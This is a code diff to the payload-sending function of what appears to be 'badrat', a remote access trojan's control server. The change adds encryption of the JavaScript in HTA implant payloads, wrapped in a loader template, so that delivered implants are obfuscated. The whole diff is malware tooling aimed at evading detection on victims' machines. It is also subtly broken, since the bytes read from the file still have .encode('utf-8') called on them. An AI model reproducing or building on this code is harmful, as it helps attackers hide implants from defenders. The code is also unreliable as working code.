@@ -327,8 +327,14 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
 
     elif(ratID): # Spawn new rat from current rat
         pretty_print("[*] Sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
-        fd = open(os.getcwd() + "/rats/badrat." + types[ratID], 'r')
+        fd = open(os.getcwd() + "/rats/badrat." + types[ratID], 'rb')
         ratcode = fd.read()
+        
+        if(types[ratID] == "hta" and not no_payload_encryption):
+            key = ekript.gen_key()
+            js_source = ratcode.split(b"<script>")[1].split(b"</script>")[0]
+            ratcode = ekript.make_hta_loader_template(ekript.ekript_js(js_source, key), key, ratcode)
+
         ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
 
     fd.close()
